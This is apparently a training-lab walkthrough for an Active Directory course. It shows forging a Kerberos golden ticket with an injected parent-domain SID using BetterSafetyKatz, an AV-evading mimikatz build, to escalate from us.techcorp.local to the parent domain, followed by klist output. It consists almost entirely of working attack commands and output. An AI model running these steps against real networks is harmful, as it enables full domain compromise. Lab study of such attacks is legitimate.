# Hands-On 21
```
Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent
domain, techcorp.local using the krbtgt hash of us.techcorp.local.
```
## Index Of Content:

  1. [Escalate Privileges](#escalate-privileges)


##Escalate Privileges

Create new Golden ticket :

```
C:\Windows\system32>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946 /krbtgt:b0975ae49f441adc6b024ad238935af5 /ptt" "exit"
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946 /krbtgt:b0975ae49f441adc6b024ad238935af5 /ptt
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-2781415573-3701854478-2406986946 ;
ServiceKey: b0975ae49f441adc6b024ad238935af5 - rc4_hmac_nt
Lifetime  : 2/28/2023 12:01:41 PM ; 2/25/2033 12:01:41 PM ; 2/25/2033 12:01:41 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!

```
C:\Windows\system32>klist

Current LogonId is 0:0x738a20d

Cached Tickets: (2)

#0>     Client: Administrator @ us.techcorp.local
        Server: krbtgt/us.techcorp.local @ us.techcorp.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/28/2023 12:01:41 (local)
        End Time:   2/25/2033 12:01:41 (local)
        Renew Time: 2/25/2033 12:01:41 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ us.techcorp.local
        Server: CIFS/techcorp-dc.techcorp.local @ TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/28/2023 11:54:20 (local)
        End Time:   2/28/2023 21:54:20 (local)
        Renew Time: 3/7/2023 11:54:20 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

```
